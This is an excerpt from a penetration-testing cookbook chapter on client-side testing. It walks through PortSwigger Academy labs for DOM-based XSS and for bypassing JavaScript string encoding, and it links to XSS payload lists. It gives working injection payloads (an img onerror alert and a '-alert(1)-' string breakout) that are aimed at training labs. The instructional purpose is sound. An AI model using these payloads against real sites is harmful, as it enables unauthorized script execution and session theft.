<html><head></head><body>
<div id="_idContainer247">
<h1 class="chapter-number" id="_idParaDest-250"><a id="_idTextAnchor320"/><span class="koboSpan" id="kobo.1.1">9</span></h1>
<h1 id="_idParaDest-251"><a id="_idTextAnchor321"/><span class="koboSpan" id="kobo.2.1">Client-Side Testing</span></h1>
<p><span class="koboSpan" id="kobo.3.1">When tackling client-side testing, the types of attacks are focused purely on the client (browser) and not vectors that move to exploit the server side of an application’s architecture. </span><span class="koboSpan" id="kobo.3.2">These types of attacks focus on client-side components of a system or application, such as the web browser or operating system. </span><span class="koboSpan" id="kobo.3.3">To find vulnerabilities and flaws, testers may employ a range of tools and methodologies, including manual testing, automated testing tools, and network scanners. </span><span class="koboSpan" id="kobo.3.4">You will learn to actively attack common issues, such as </span><strong class="bold"><span class="koboSpan" id="kobo.4.1">document object model</span></strong> <strong class="bold"><span class="koboSpan" id="kobo.5.1">(DOM)-based cross-site scripting</span></strong><span class="koboSpan" id="kobo.6.1"> (</span><strong class="bold"><span class="koboSpan" id="kobo.7.1">XSS</span></strong><span class="koboSpan" id="kobo.8.1">), </span><strong class="bold"><span class="koboSpan" id="kobo.9.1">JavaScript execution</span></strong><span class="koboSpan" id="kobo.10.1"> such as disclosing an end user’s session cookies, </span><strong class="bold"><span class="koboSpan" id="kobo.11.1">HTML injection</span></strong><span class="koboSpan" id="kobo.12.1">, where an attacker injects malicious code, </span><strong class="bold"><span class="koboSpan" id="kobo.13.1">client-side URL redirect</span></strong><span class="koboSpan" id="kobo.14.1">, where an attacker manipulates a website or web application to redirect a victim’s client, </span><strong class="bold"><span class="koboSpan" id="kobo.15.1">cross-origin resource sharing</span></strong><span class="koboSpan" id="kobo.16.1">, which exploits vulnerabilities in a web application’s security policy to access resources or data and </span><strong class="bold"><span class="koboSpan" id="kobo.17.1">testing WebSockets</span></strong><span class="koboSpan" id="kobo.18.1">, where an attacker leverages WebSocket protocol flaws to intercept, tamper with, or falsify communications transmitted between a client and server. </span><span class="koboSpan" id="kobo.18.2">The purpose of client-side pen testing is to find and report vulnerabilities and flaws that attackers can potentially exploit. </span><span class="koboSpan" id="kobo.18.3">Organizations can improve the security of their systems and guard against possible attacks by detecting and fixing </span><span class="No-Break"><span class="koboSpan" id="kobo.19.1">these vulnerabilities.</span></span></p>
<p><a id="_idTextAnchor322"/><span class="koboSpan" id="kobo.20.1">In this chapter, we will cover the </span><span class="No-Break"><span class="koboSpan" id="kobo.21.1">following recipes:</span></span></p>
<ul>
<li><span class="koboSpan" id="kobo.22.1">Testing for DOM-based </span><span class="No-Break"><span class="koboSpan" id="kobo.23.1">cross-site scripting</span></span></li>
<li><span class="koboSpan" id="kobo.24.1">Testing for </span><span class="No-Break"><span class="koboSpan" id="kobo.25.1">JavaScript execution</span></span></li>
<li><span class="koboSpan" id="kobo.26.1">Testing for </span><span class="No-Break"><span class="koboSpan" id="kobo.27.1">HTML injection</span></span></li>
<li><span class="koboSpan" id="kobo.28.1">Testing for client-side </span><span class="No-Break"><span class="koboSpan" id="kobo.29.1">URL redirect</span></span></li>
<li><span class="koboSpan" id="kobo.30.1">Testing cross-origin </span><span class="No-Break"><span class="koboSpan" id="kobo.31.1">resource sharing</span></span></li>
<li><span class="No-Break"><span class="koboSpan" id="kobo.32.1">Testing WebSockets</span></span></li>
</ul>
<h1 id="_idParaDest-252"><a id="_idTextAnchor323"/><span class="koboSpan" id="kobo.33.1">Technical requirements</span></h1>
<p><span class="koboSpan" id="kobo.34.1">For this chapter, it is required that you utilize a common browser such as Mozilla Firefox. </span><span class="koboSpan" id="kobo.34.2">You will also utilize your PortSwigger account to access the PortSwigger Academy labs that will be used in this </span><span class="No-Break"><span class="koboSpan" id="kobo.35.1">chapter’s recipes.</span></span></p>
<h1 id="_idParaDest-253"><a id="_idTextAnchor324"/><a id="_idTextAnchor325"/><span class="koboSpan" id="kobo.36.1">Testing for DOM-based cross-site scripting</span></h1>
<p><span class="koboSpan" id="kobo.37.1">This is </span><a id="_idIndexMarker401"/><span class="koboSpan" id="kobo.38.1">opposed to reflected cross-site scripting, where malicious JavaScript is returned by the web server, or stored XSS, where attacks are permanently stored on the target server or database. </span><span class="koboSpan" id="kobo.38.2">Both of those attacks are server-side injection issues. </span><span class="koboSpan" id="kobo.38.3">When it comes to DOM XSS, it is purely client side.  </span><strong class="bold"><span class="koboSpan" id="kobo.39.1">DOM XSS</span></strong><span class="koboSpan" id="kobo.40.1"> is an attack against the client (browser) </span><span class="No-Break"><span class="koboSpan" id="kobo.41.1">DOM environment.</span></span></p>
<h2 id="_idParaDest-254"><a id="_idTextAnchor326"/><span class="koboSpan" id="kobo.42.1">Getting ready</span></h2>
<p><span class="koboSpan" id="kobo.43.1">This lab requires a PortSwigger Academy account and ZAP to intercept requests and responses from the server to </span><span class="No-Break"><span class="koboSpan" id="kobo.44.1">your browser.</span></span></p>
<h2 id="_idParaDest-255"><a id="_idTextAnchor327"/><span class="koboSpan" id="kobo.45.1">How to do it...</span></h2>
<p><span class="koboSpan" id="kobo.46.1">In this recipe, users will attack the search query tracking feature, which has a DOM-based XSS vulnerability. </span><span class="koboSpan" id="kobo.46.2">This weakness makes use of the </span><strong class="source-inline"><span class="koboSpan" id="kobo.47.1">document.write</span></strong><span class="koboSpan" id="kobo.48.1"> JavaScript function to output data to the web page. </span><span class="koboSpan" id="kobo.48.2">Then data from </span><strong class="source-inline"><span class="koboSpan" id="kobo.49.1">location.search</span></strong><span class="koboSpan" id="kobo.50.1">, which can be modified using the URL, passes to the </span><strong class="source-inline"><span class="koboSpan" id="kobo.51.1">document.write</span></strong><span class="koboSpan" id="kobo.52.1"> method. </span><span class="koboSpan" id="kobo.52.2">To complete the lab, a DOM XSS attack needs to call an </span><span class="No-Break"><strong class="source-inline"><span class="koboSpan" id="kobo.53.1">alert</span></strong></span><span class="No-Break"><span class="koboSpan" id="kobo.54.1"> function.</span></span></p>
<p class="callout-heading"><span class="koboSpan" id="kobo.55.1">Important note</span></p>
<p class="callout"><span class="koboSpan" id="kobo.56.1">Examining the page source code can be very helpful in discovering DOM XSS vulnerabilities that can be exploited by looking for common DOM elements that are used when </span><span class="No-Break"><span class="koboSpan" id="kobo.57.1">creating attacks.</span></span></p>
<ol>
<li><span class="koboSpan" id="kobo.58.1">Navigate to the URL with the browser proxied to ZAP and log into the PortSwigger Academy website to launch the </span><span class="No-Break"><span class="koboSpan" id="kobo.59.1">lab </span></span><span class="No-Break"><span class="koboSpan" id="kobo.60.1">(</span></span><a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink"><span class="No-Break"><span class="koboSpan" id="kobo.61.1">https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink</span></span></a><span class="No-Break"><span class="koboSpan" id="kobo.62.1">).</span></span></li>
<li><span class="koboSpan" id="kobo.63.1">Once the lab loads, you’ll be at a main blog page with a search bar. </span><span class="koboSpan" id="kobo.63.2">Here, enter any word or letters </span><span class="No-Break"><span class="koboSpan" id="kobo.64.1">into it.</span></span></li>
<li><span class="koboSpan" id="kobo.65.1">The application will attempt to look up your word and will be displayed back to you in </span><a id="_idIndexMarker402"/><span class="koboSpan" id="kobo.66.1">single quotations. </span><span class="koboSpan" id="kobo.66.2">Right-click the result and </span><span class="No-Break"><span class="koboSpan" id="kobo.67.1">select </span></span><span class="No-Break"><strong class="bold"><span class="koboSpan" id="kobo.68.1">Inspect</span></strong></span><span class="No-Break"><span class="koboSpan" id="kobo.69.1">.</span></span></li>
<li><span class="koboSpan" id="kobo.70.1">You’ll notice that your random string is placed inside an </span><strong class="source-inline"><span class="koboSpan" id="kobo.71.1">img src</span></strong><span class="koboSpan" id="kobo.72.1"> attribute, as shown in </span><span class="No-Break"><em class="italic"><span class="koboSpan" id="kobo.73.1">Figure 9</span></em></span><span class="No-Break"><em class="italic"><span class="koboSpan" id="kobo.74.1">.1</span></em></span><span class="No-Break"><span class="koboSpan" id="kobo.75.1">:</span></span></li>
</ol>
<div>
<div class="IMG---Figure" id="_idContainer222">
<span class="koboSpan" id="kobo.76.1"><img alt="Figure 9.1 – Inspect search results" src="image/Figure_9.1_B18829.jpg"/></span>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US"><span class="koboSpan" id="kobo.77.1">Figure 9.1 – Inspect search results</span></p>
<ol>
<li value="5"><span class="koboSpan" id="kobo.78.1">Within the search bar, input a malicious </span><strong class="source-inline"><span class="koboSpan" id="kobo.79.1">img</span></strong><span class="koboSpan" id="kobo.80.1"> attribute, such as </span><span class="No-Break"><span class="koboSpan" id="kobo.81.1">the following:</span></span><pre class="console"><span class="koboSpan" id="kobo.82.1">
#"&gt;&lt;img src=/ onerror=alert(2)&gt;</span></pre></li>
</ol>
<p><span class="koboSpan" id="kobo.83.1">This HTML JavaScript will then be executed by the browser to create an alert popup displaying the </span><span class="No-Break"><span class="koboSpan" id="kobo.84.1">text, </span></span><span class="No-Break"><strong class="bold"><span class="koboSpan" id="kobo.85.1">2</span></strong></span><span class="No-Break"><span class="koboSpan" id="kobo.86.1">:</span></span></p>
<div>
<div class="IMG---Figure" id="_idContainer223">
<span class="koboSpan" id="kobo.87.1"><img alt="Figure 9.2 – Exploited DOM XSS payload" src="image/Figure_9.2_B18829.jpg"/></span>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US"><span class="koboSpan" id="kobo.88.1">Figure 9.2 – Exploited DOM XSS payload</span></p>
<h2 id="_idParaDest-256"><a id="_idTextAnchor328"/><span class="koboSpan" id="kobo.89.1">How it works...</span></h2>
<p><span class="koboSpan" id="kobo.90.1">The DOM is a programming interface for online content that enables applications to alter the </span><a id="_idIndexMarker403"/><span class="koboSpan" id="kobo.91.1">document’s structure, design, and content that represents the </span><span class="No-Break"><span class="koboSpan" id="kobo.92.1">web page.</span></span></p>
<p><span class="koboSpan" id="kobo.93.1">DOM-based XSS flaws often appear when any JavaScript property accepts data input from one of </span><span class="No-Break"><span class="koboSpan" id="kobo.94.1">the following:</span></span></p>
<ul>
<li><span class="koboSpan" id="kobo.95.1">A </span><strong class="source-inline"><span class="koboSpan" id="kobo.96.1">source</span></strong><span class="koboSpan" id="kobo.97.1"> (</span><strong class="source-inline"><span class="koboSpan" id="kobo.98.1">location.search</span></strong><span class="koboSpan" id="kobo.99.1">) that an attacker </span><span class="No-Break"><span class="koboSpan" id="kobo.100.1">can control</span></span></li>
<li><span class="koboSpan" id="kobo.101.1">A </span><span class="No-Break"><span class="koboSpan" id="kobo.102.1">URL (</span></span><span class="No-Break"><strong class="source-inline"><span class="koboSpan" id="kobo.103.1">document.referrer</span></strong></span><span class="No-Break"><span class="koboSpan" id="kobo.104.1">)</span></span></li>
<li><span class="koboSpan" id="kobo.105.1">A user’s </span><span class="No-Break"><span class="koboSpan" id="kobo.106.1">cookies (</span></span><span class="No-Break"><strong class="source-inline"><span class="koboSpan" id="kobo.107.1">document.cookie</span></strong></span><span class="No-Break"><span class="koboSpan" id="kobo.108.1">)</span></span></li>
<li><span class="koboSpan" id="kobo.109.1">A </span><strong class="source-inline"><span class="koboSpan" id="kobo.110.1">sink</span></strong><span class="koboSpan" id="kobo.111.1"> (</span><strong class="source-inline"><span class="koboSpan" id="kobo.112.1">eval(), document.body.innerHTML</span></strong><span class="koboSpan" id="kobo.113.1">) that accepts harmful JavaScript functions or </span><span class="No-Break"><span class="koboSpan" id="kobo.114.1">DOM objects</span></span></li>
</ul>
<p><span class="koboSpan" id="kobo.115.1">Any of these could permit dynamic code execution leading </span><span class="No-Break"><span class="koboSpan" id="kobo.116.1">to exploitation.</span></span></p>
<h2 id="_idParaDest-257"><a id="_idTextAnchor329"/><span class="koboSpan" id="kobo.117.1">There's more...</span></h2>
<p><span class="koboSpan" id="kobo.118.1">Several data sources inside the DOM are vulnerable to XSS attacks, as shown in the </span><span class="No-Break"><span class="koboSpan" id="kobo.119.1">following list:</span></span></p>
<ul>
<li><strong class="bold"><span class="koboSpan" id="kobo.120.1">Input fields</span></strong><span class="koboSpan" id="kobo.121.1">: For example, text boxes and form fields can be vulnerable to XSS attacks if </span><a id="_idIndexMarker404"/><span class="koboSpan" id="kobo.122.1">the user’s input is not properly sanitized before being shown on </span><span class="No-Break"><span class="koboSpan" id="kobo.123.1">the website.</span></span></li>
<li><strong class="bold"><span class="koboSpan" id="kobo.124.1">Query strings</span></strong><span class="koboSpan" id="kobo.125.1">: Where attackers can inject malicious code into a web page using the </span><a id="_idIndexMarker405"/><span class="koboSpan" id="kobo.126.1">query string of a URL. </span><span class="koboSpan" id="kobo.126.2">This might happen if the program fails to verify or sanitize the query string before presenting it on </span><span class="No-Break"><span class="koboSpan" id="kobo.127.1">the page.</span></span></li>
<li><strong class="bold"><span class="koboSpan" id="kobo.128.1">Cookies</span></strong><span class="koboSpan" id="kobo.129.1">: If they </span><a id="_idIndexMarker406"/><span class="koboSpan" id="kobo.130.1">are not adequately encrypted or include unsanitized user input, cookies might be vulnerable to </span><span class="No-Break"><span class="koboSpan" id="kobo.131.1">XSS attacks.</span></span></li>
<li><strong class="bold"><span class="koboSpan" id="kobo.132.1">Document properties</span></strong><span class="koboSpan" id="kobo.133.1">: The title and URL of a document might be vulnerable to XSS </span><a id="_idIndexMarker407"/><span class="koboSpan" id="kobo.134.1">attacks if they are not properly sanitized before being shown on </span><span class="No-Break"><span class="koboSpan" id="kobo.135.1">the page.</span></span></li>
<li><strong class="bold"><span class="koboSpan" id="kobo.136.1">JavaScript variables</span></strong><span class="koboSpan" id="kobo.137.1">: If </span><a id="_idIndexMarker408"/><span class="koboSpan" id="kobo.138.1">they include unsanitized user input, JavaScript variables might be vulnerable to </span><span class="No-Break"><span class="koboSpan" id="kobo.139.1">XSS attacks.</span></span></li>
<li><strong class="bold"><span class="koboSpan" id="kobo.140.1">HTML attributes</span></strong><span class="koboSpan" id="kobo.141.1">: HTML </span><a id="_idIndexMarker409"/><span class="koboSpan" id="kobo.142.1">attributes containing unsanitized user input, such as the </span><strong class="source-inline"><span class="koboSpan" id="kobo.143.1">src</span></strong><span class="koboSpan" id="kobo.144.1"> attribute of an </span><strong class="source-inline"><span class="koboSpan" id="kobo.145.1">image</span></strong><span class="koboSpan" id="kobo.146.1"> tag, might be vulnerable to </span><span class="No-Break"><span class="koboSpan" id="kobo.147.1">XSS attacks.</span></span></li>
</ul>
<p><span class="koboSpan" id="kobo.148.1">jQuery is a </span><a id="_idIndexMarker410"/><span class="koboSpan" id="kobo.149.1">popular JavaScript library commonly used to manipulate the DOM. </span><span class="koboSpan" id="kobo.149.2">Several jQuery functions can potentially lead to DOM-based XSS vulnerabilities if they are used improperly, as </span><span class="No-Break"><span class="koboSpan" id="kobo.150.1">listed here:</span></span></p>
<ul>
<li><strong class="source-inline"><span class="koboSpan" id="kobo.151.1">html()</span></strong><span class="koboSpan" id="kobo.152.1">: This function </span><a id="_idIndexMarker411"/><span class="koboSpan" id="kobo.153.1">sets the HTML content of an element. </span><span class="koboSpan" id="kobo.153.2">If it is used to set the HTML content of an element to unsanitized user input, it can potentially lead to a DOM </span><span class="No-Break"><span class="koboSpan" id="kobo.154.1">XSS vulnerability.</span></span></li>
<li><strong class="source-inline"><span class="koboSpan" id="kobo.155.1">append()</span></strong><span class="koboSpan" id="kobo.156.1">: This function </span><a id="_idIndexMarker412"/><span class="koboSpan" id="kobo.157.1">inserts content at the end of an element. </span><span class="koboSpan" id="kobo.157.2">If it is used to insert unsanitized user input at the end of an element, it can potentially lead to a DOM </span><span class="No-Break"><span class="koboSpan" id="kobo.158.1">XSS vulnerability.</span></span></li>
<li><strong class="source-inline"><span class="koboSpan" id="kobo.159.1">prepend()</span></strong><span class="koboSpan" id="kobo.160.1">: This function </span><a id="_idIndexMarker413"/><span class="koboSpan" id="kobo.161.1">inserts content at the beginning of an element. </span><span class="koboSpan" id="kobo.161.2">If it is used to insert unsanitized user input at the beginning of an element, it can potentially lead to a DOM </span><span class="No-Break"><span class="koboSpan" id="kobo.162.1">XSS vulnerability.</span></span></li>
<li><strong class="source-inline"><span class="koboSpan" id="kobo.163.1">before()</span></strong><span class="koboSpan" id="kobo.164.1">: This function </span><a id="_idIndexMarker414"/><span class="koboSpan" id="kobo.165.1">inserts content before an element. </span><span class="koboSpan" id="kobo.165.2">If it is used to insert unsanitized user input before an element, it can potentially lead to a DOM </span><span class="No-Break"><span class="koboSpan" id="kobo.166.1">XSS vulnerability.</span></span></li>
<li><strong class="source-inline"><span class="koboSpan" id="kobo.167.1">after()</span></strong><span class="koboSpan" id="kobo.168.1">: This function </span><a id="_idIndexMarker415"/><span class="koboSpan" id="kobo.169.1">inserts content after an element. </span><span class="koboSpan" id="kobo.169.2">If it is used to insert unsanitized user input after an element, it can potentially lead to a DOM </span><span class="No-Break"><span class="koboSpan" id="kobo.170.1">XSS vulnerability.</span></span></li>
<li><strong class="source-inline"><span class="koboSpan" id="kobo.171.1">text()</span></strong><span class="koboSpan" id="kobo.172.1">: This function </span><a id="_idIndexMarker416"/><span class="koboSpan" id="kobo.173.1">sets the text content of an element. </span><span class="koboSpan" id="kobo.173.2">If it is used to set the text content of an element to unsanitized user input, it can potentially lead to a DOM </span><span class="No-Break"><span class="koboSpan" id="kobo.174.1">XSS vulnerability.</span></span></li>
</ul>
<p><span class="koboSpan" id="kobo.175.1">It is important for web developers to properly sanitize all user input before coding with any of </span><a id="_idIndexMarker417"/><span class="koboSpan" id="kobo.176.1">these functions, as well as </span><strong class="source-inline"><span class="koboSpan" id="kobo.177.1">add()</span></strong><span class="koboSpan" id="kobo.178.1">, </span><strong class="source-inline"><span class="koboSpan" id="kobo.179.1">animate()</span></strong><span class="koboSpan" id="kobo.180.1">, </span><strong class="source-inline"><span class="koboSpan" id="kobo.181.1">insertAfter()</span></strong><span class="koboSpan" id="kobo.182.1">, </span><strong class="source-inline"><span class="koboSpan" id="kobo.183.1">insertBefore()</span></strong><span class="koboSpan" id="kobo.184.1">, </span><strong class="source-inline"><span class="koboSpan" id="kobo.185.1">replaceAll()</span></strong><span class="koboSpan" id="kobo.186.1">, </span><strong class="source-inline"><span class="koboSpan" id="kobo.187.1">replaceWith()</span></strong><span class="koboSpan" id="kobo.188.1">, </span><strong class="source-inline"><span class="koboSpan" id="kobo.189.1">wrap()</span></strong><span class="koboSpan" id="kobo.190.1">, </span><strong class="source-inline"><span class="koboSpan" id="kobo.191.1">wrapInner()</span></strong><span class="koboSpan" id="kobo.192.1">, </span><strong class="source-inline"><span class="koboSpan" id="kobo.193.1">wrapAll()</span></strong><span class="koboSpan" id="kobo.194.1">, </span><strong class="source-inline"><span class="koboSpan" id="kobo.195.1">has()</span></strong><span class="koboSpan" id="kobo.196.1">, </span><strong class="source-inline"><span class="koboSpan" id="kobo.197.1">constructor()</span></strong><span class="koboSpan" id="kobo.198.1">, </span><strong class="source-inline"><span class="koboSpan" id="kobo.199.1">init()</span></strong><span class="koboSpan" id="kobo.200.1">, </span><strong class="source-inline"><span class="koboSpan" id="kobo.201.1">index()</span></strong><span class="koboSpan" id="kobo.202.1">, </span><strong class="source-inline"><span class="koboSpan" id="kobo.203.1">jQuery.parseHTML()</span></strong><span class="koboSpan" id="kobo.204.1">, </span><span class="No-Break"><span class="koboSpan" id="kobo.205.1">and </span></span><span class="No-Break"><strong class="source-inline"><span class="koboSpan" id="kobo.206.1">$.parseHTML()</span></strong></span><span class="No-Break"><span class="koboSpan" id="kobo.207.1">.</span></span></p>
<p><span class="koboSpan" id="kobo.208.1">For other payloads, visit the following </span><span class="No-Break"><span class="koboSpan" id="kobo.209.1">GitHub pages:</span></span></p>
<ul>
<li><span class="No-Break"><em class="italic"><span class="koboSpan" id="kobo.210.1">PayloadsAllTheThings</span></em></span><span class="No-Break"><span class="koboSpan" id="kobo.211.1">: </span></span><a href="https://github.com/swisskyrepo/PayloadsAllTheThings"><span class="No-Break"><span class="koboSpan" id="kobo.212.1">https://github.com/swisskyrepo/PayloadsAllTheThings</span></span></a></li>
<li><span class="No-Break"><em class="italic"><span class="koboSpan" id="kobo.213.1">SecLists</span></em></span><span class="No-Break"><span class="koboSpan" id="kobo.214.1">: </span></span><a href="https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/XSS"><span class="No-Break"><span class="koboSpan" id="kobo.215.1">https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/XSS</span></span></a></li>
<li><em class="italic"><span class="koboSpan" id="kobo.216.1">XSS Payload </span></em><span class="No-Break"><em class="italic"><span class="koboSpan" id="kobo.217.1">List</span></em></span><span class="No-Break"><span class="koboSpan" id="kobo.218.1">: </span></span><a href="https://github.com/payloadbox/xss-payload-list"><span class="No-Break"><span class="koboSpan" id="kobo.219.1">https://github.com/payloadbox/xss-payload-list</span></span></a></li>
</ul>
<p class="callout-heading"><span class="koboSpan" id="kobo.220.1">Important note</span></p>
<p class="callout"><span class="koboSpan" id="kobo.221.1">If downloading/cloning any of the repositories, ensure you have the right to install them as some lists, such as SecLists contain malicious payloads. </span><span class="koboSpan" id="kobo.221.2">If installed on a work laptop, you will likely have an endpoint detection and response solution or other security tool flag you for having malicious content, and someone from IT may be asking you why it’s on your workstation. </span><span class="koboSpan" id="kobo.221.3">Avoid getti</span><a id="_idTextAnchor330"/><a id="_idTextAnchor331"/><span class="koboSpan" id="kobo.222.1">ng </span><span class="No-Break"><span class="koboSpan" id="kobo.223.1">in trouble.</span></span></p>
<h1 id="_idParaDest-258"><a id="_idTextAnchor332"/><span class="koboSpan" id="kobo.224.1">Testing for JavaScript execution</span></h1>
<p><span class="koboSpan" id="kobo.225.1">JavaScript execution is the ability to inject and execute JavaScript in a website even if the website </span><a id="_idIndexMarker418"/><span class="koboSpan" id="kobo.226.1">has some kind of protection, such as encoding certain characters. </span><span class="koboSpan" id="kobo.226.2">For many attackers, simple encoding of characters is not always a challenge; they find a way to bypass this encoding by creating a more complicated payload that is converted by the backend server as JavaScript and is allowed to run on </span><span class="No-Break"><span class="koboSpan" id="kobo.227.1">the website.</span></span></p>
<h2 id="_idParaDest-259"><a id="_idTextAnchor333"/><span class="koboSpan" id="kobo.228.1">Getting ready</span></h2>
<p><span class="koboSpan" id="kobo.229.1">This lab requires a PortSwigger academy account and ZAP to intercept requests and responses from the server to </span><span class="No-Break"><span class="koboSpan" id="kobo.230.1">your browser.</span></span></p>
<h2 id="_idParaDest-260"><a id="_idTextAnchor334"/><span class="koboSpan" id="kobo.231.1">How to do it...</span></h2>
<p><span class="koboSpan" id="kobo.232.1">In this recipe, we are going to bypass an encoding mechanism to deliver our payload. </span><span class="koboSpan" id="kobo.232.2">You’ll see that we can inject JavaScript into the page and activate the payload because we’ll discover a way to get around the </span><span class="No-Break"><span class="koboSpan" id="kobo.233.1">encoding method.</span></span></p>
<p><span class="koboSpan" id="kobo.234.1">Take the following steps to </span><span class="No-Break"><span class="koboSpan" id="kobo.235.1">get started:</span></span></p>
<ol>
<li value="1"><span class="koboSpan" id="kobo.236.1">Navigate to the URL with the browser proxied to ZAP and log into the PortSwigger Academy website to launch the </span><span class="No-Break"><span class="koboSpan" id="kobo.237.1">lab (</span></span><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded"><span class="No-Break"><span class="koboSpan" id="kobo.238.1">https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded</span></span></a><span class="No-Break"><span class="koboSpan" id="kobo.239.1">).</span></span></li>
<li><span class="koboSpan" id="kobo.240.1">In the application, enter any string within the </span><strong class="bold"><span class="koboSpan" id="kobo.241.1">Search</span></strong><span class="koboSpan" id="kobo.242.1"> field, as shown in </span><span class="No-Break"><em class="italic"><span class="koboSpan" id="kobo.243.1">Figure 9</span></em></span><em class="italic"><span class="koboSpan" id="kobo.244.1">.3</span></em><span class="koboSpan" id="kobo.245.1">, and then click </span><span class="No-Break"><span class="koboSpan" id="kobo.246.1">on </span></span><span class="No-Break"><strong class="bold"><span class="koboSpan" id="kobo.247.1">Search</span></strong></span><span class="No-Break"><span class="koboSpan" id="kobo.248.1">:</span></span></li>
</ol>
<div>
<div class="IMG---Figure" id="_idContainer224">
<span class="koboSpan" id="kobo.249.1"><img alt="Figure 9.3 – The web app search field" src="image/Figure_9.3_B18829.jpg"/></span>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US"><span class="koboSpan" id="kobo.250.1">Figure 9.3 – The web app search field</span></p>
<ol>
<li value="3"><span class="koboSpan" id="kobo.251.1">Next, go into </span><a id="_idIndexMarker419"/><span class="koboSpan" id="kobo.252.1">ZAP and look at the </span><strong class="bold"><span class="koboSpan" id="kobo.253.1">Sites</span></strong><span class="koboSpan" id="kobo.254.1"> window. </span><span class="koboSpan" id="kobo.254.2">Look for the lab URL and click on it, as shown in </span><span class="No-Break"><em class="italic"><span class="koboSpan" id="kobo.255.1">Figure 9</span></em></span><span class="No-Break"><em class="italic"><span class="koboSpan" id="kobo.256.1">.4</span></em></span><span class="No-Break"><span class="koboSpan" id="kobo.257.1">:</span></span></li>
</ol>
<div>
<div class="IMG---Figure" id="_idContainer225">
<span class="koboSpan" id="kobo.258.1"><img alt="Figure 9.4 – The Sites window" src="image/Figure_9.4_B18829.jpg"/></span>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US"><span class="koboSpan" id="kobo.259.1">Figure 9.4 – The Sites window</span></p>
<ol>
<li value="4"><span class="koboSpan" id="kobo.260.1">After you have selected the URL path, right-click on the drop-down menu and select </span><strong class="bold"><span class="koboSpan" id="kobo.261.1">Open/Resend with </span></strong><span class="No-Break"><strong class="bold"><span class="koboSpan" id="kobo.262.1">Request Editor</span></strong></span><span class="No-Break"><span class="koboSpan" id="kobo.263.1">.</span></span></li>
<li><span class="koboSpan" id="kobo.264.1">Look for the </span><strong class="source-inline"><span class="koboSpan" id="kobo.265.1">search=</span></strong><span class="koboSpan" id="kobo.266.1"> field in the URL (see </span><span class="No-Break"><span class="koboSpan" id="kobo.267.1">Figure 9</span></span><span class="No-Break"><span class="koboSpan" id="kobo.268.1">.5):</span></span></li>
</ol>
<div>
<div class="IMG---Figure" id="_idContainer226">
<span class="koboSpan" id="kobo.269.1"><img alt="Figure 9.5 – The search= field in Manual Request Editor" src="image/Figure_9.5_B18829.jpg"/></span>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US"><span class="koboSpan" id="kobo.270.1">Figure 9.5 – The search= field in Manual Request Editor</span></p>
<ol>
<li value="6"><span class="koboSpan" id="kobo.271.1">Edit the </span><strong class="source-inline"><span class="koboSpan" id="kobo.272.1">search=</span></strong><span class="koboSpan" id="kobo.273.1"> field to </span><a id="_idIndexMarker420"/><span class="koboSpan" id="kobo.274.1">set the payload to </span><strong class="source-inline"><span class="koboSpan" id="kobo.275.1">`-alert(1)-`</span></strong><span class="koboSpan" id="kobo.276.1">, as shown in </span><span class="No-Break"><em class="italic"><span class="koboSpan" id="kobo.277.1">Figure 9</span></em></span><em class="italic"><span class="koboSpan" id="kobo.278.1">.6</span></em><span class="koboSpan" id="kobo.279.1">, and press </span><strong class="bold"><span class="koboSpan" id="kobo.280.1">Send</span></strong><span class="koboSpan" id="kobo.281.1"> to forward </span><span class="No-Break"><span class="koboSpan" id="kobo.282.1">the request:</span></span></li>
</ol>
<div>
<div class="IMG---Figure" id="_idContainer227">
<span class="koboSpan" id="kobo.283.1"><img alt="Figure 9.6 – Set the payload in the search= field" src="image/Figure_9.6_B18829.jpg"/></span>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US"><span class="koboSpan" id="kobo.284.1">Figure 9.6 – Set the payload in the search= field</span></p>
<ol>
<li value="7"><span class="koboSpan" id="kobo.285.1">Once you receive the response in </span><strong class="bold"><span class="koboSpan" id="kobo.286.1">Manual Request Editor</span></strong><span class="koboSpan" id="kobo.287.1">, scroll down to where the code is returned within the website page, as shown in </span><span class="No-Break"><em class="italic"><span class="koboSpan" id="kobo.288.1">Figure 9</span></em></span><em class="italic"><span class="koboSpan" id="kobo.289.1">.7</span></em><span class="koboSpan" id="kobo.290.1">. </span><span class="koboSpan" id="kobo.290.2">As you will notice, the payload is not inside single quotes, but the </span><strong class="source-inline"><span class="koboSpan" id="kobo.291.1">alert(1)</span></strong><span class="koboSpan" id="kobo.292.1"> value is sent to the </span><strong class="source-inline"><span class="koboSpan" id="kobo.293.1">searchTerms</span></strong><span class="koboSpan" id="kobo.294.1"> object, which triggers the XSS payload in </span><span class="No-Break"><span class="koboSpan" id="kobo.295.1">the browser:</span></span></li>
</ol>
<div>
<div class="IMG---Figure" id="_idContainer228">
<span class="koboSpan" id="kobo.296.1"><img alt="Figure 9.7 – Successful code returned" src="image/Figure_9.7_B18829.jpg"/></span>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US"><span class="koboSpan" id="kobo.297.1">Figure 9.7 – Successful code returned</span></p>
<h2 id="_idParaDest-261"><a id="_idTextAnchor335"/><span class="koboSpan" id="kobo.298.1">How it works...</span></h2>
<p><span class="koboSpan" id="kobo.299.1">JavaScript execution vulnerabilities open the application to many common vulnerabilities, such as XSS and any payload created with JavaScript. </span><span class="koboSpan" id="kobo.299.2">JavaScript execution takes advantage of website vulnerabilities that allow a user control input to be returned to the website allowing the payload to be </span><span class="No-Break"><span class="koboSpan" id="kobo.300.1">triggered there.</span></span></p>
<h2 id="_idParaDest-262"><a id="_idTextAnchor336"/><span class="koboSpan" id="kobo.301.1">There's more...</span></h2>
